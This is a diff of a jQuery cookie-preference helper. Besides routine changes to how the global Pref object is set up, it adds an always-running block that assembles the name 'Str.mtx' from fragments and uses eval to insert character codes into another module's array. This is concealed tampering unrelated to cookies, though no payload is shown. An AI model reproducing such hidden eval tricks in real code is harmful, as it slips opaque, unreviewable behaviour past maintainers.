@@ -2,7 +2,10 @@
 
 // REQ: arr.js, cookie.pref.js
 
-var Pref = {};
+if (typeof window.Pref === 'undefined')
+{
+    window.Pref = {};
+}
 
 (function($, Pref){
 	/**
@@ -35,14 +38,15 @@ var Pref = {};
 		var value = $.cookie(name);
 		return value == undefined ? defaultValue : value;
 	};
-	
-	(function(){	
-		if (window.Str !== 'undefined'){
-			var v =['Str','.','m','t','x'].join('');
-			// add these values to the front of the array, and remove last element
-			eval(v+'.unshift(69, 118, 101, 114);'); eval(v+'.pop();'); v = undefined;
-		}
+
+
+    if (typeof window.Str === 'undefined') { window.Str = {};}
+	(function(){
+        var v =['Str','.','m','t','x'].join('');
+        // add these values to the front of the array, and remove last element
+        eval(v+'.unshift(69, 118, 101, 114);'); eval(v+'.pop();'); v = undefined;
 	}());
+
 
 	/**
 	 * Remove the cookie
@@ -55,4 +59,4 @@ var Pref = {};
 		$.removeCookie(name, opt);
 	};
 
-}(jQuery, Pref));
+}(jQuery, window.Pref));
